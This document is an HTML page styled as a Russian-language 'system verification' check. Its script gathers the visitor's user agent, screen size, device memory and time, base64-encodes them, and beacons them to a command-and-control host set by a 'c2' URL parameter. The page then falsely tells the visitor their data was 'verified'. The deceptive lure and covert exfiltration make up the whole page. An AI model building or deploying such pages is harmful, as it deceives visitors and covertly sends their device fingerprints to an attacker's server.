<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Hub</title>
    <style>
        body { font-family: sans-serif; background: #121212; color: white; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { background: #1e1e1e; padding: 30px; border-radius: 15px; text-align: center; border: 1px solid #333; max-width: 350px; }
        .device-name { color: #3498db; font-weight: bold; }
        .btn { background: #3498db; color: white; border: none; padding: 12px 25px; border-radius: 5px; cursor: pointer; margin-top: 20px; width: 100%; }
        #status { margin-top: 15px; font-size: 0.8em; color: #777; }
    </style>
</head>
<body>

<div class="card">
    <h2>Проверка системы</h2>
    <p>Устройство: <span id="display-device" class="device-name">Определение...</span></p>
    <p id="msg">Для верификации нажмите кнопку ниже.</p>
    <button class="btn" onclick="capture()">ПОДТВЕРДИТЬ</button>
    <div id="status">Готов к сканированию</div>
</div>

<script>
    // 1. Улучшенное определение
    function updateDisplay() {
        const ua = navigator.userAgent;
        const display = document.getElementById('display-device');
        
        console.log("User-Agent:", ua); // Увидишь это в консоли F12

        if (ua.includes("Windows NT")) {
            display.innerText = "Windows PC";
        } else if (ua.includes("Android")) {
            // Если в UA есть SM-S908 — это твой S22 Ultra
            if (ua.includes("SM-S908") || ua.includes("S22")) {
                display.innerText = "Samsung S22 Ultra";
            } else {
                display.innerText = "Android Device";
            }
        } else if (ua.includes("iPhone")) {
            display.innerText = "iPhone";
        } else {
            display.innerText = "Unknown Device";
        }
    }

    window.onload = updateDisplay;

    async function capture() {
        const status = document.getElementById('status');
        status.innerText = "Сбор артефактов...";

        const payload = {
            ua: navigator.userAgent,
            res: window.screen.width + "x" + window.screen.height,
            mem: navigator.deviceMemory || "N/A",
            time: new Date().toISOString()
        };

        // Проверка параметров C2
        const params = new URLSearchParams(window.location.search);
        const c2 = params.get('c2') || '127.0.0.1';

        // Base64
        const exfil = btoa(JSON.stringify(payload));
        
        // Отправка
        navigator.sendBeacon(`http://${c2}/log?data=${exfil}`);
        
        status.innerText = "Успешно. Данные верифицированы.";
        console.log("Payload sent to " + c2, payload);
    }
</script>

</body>
</html>
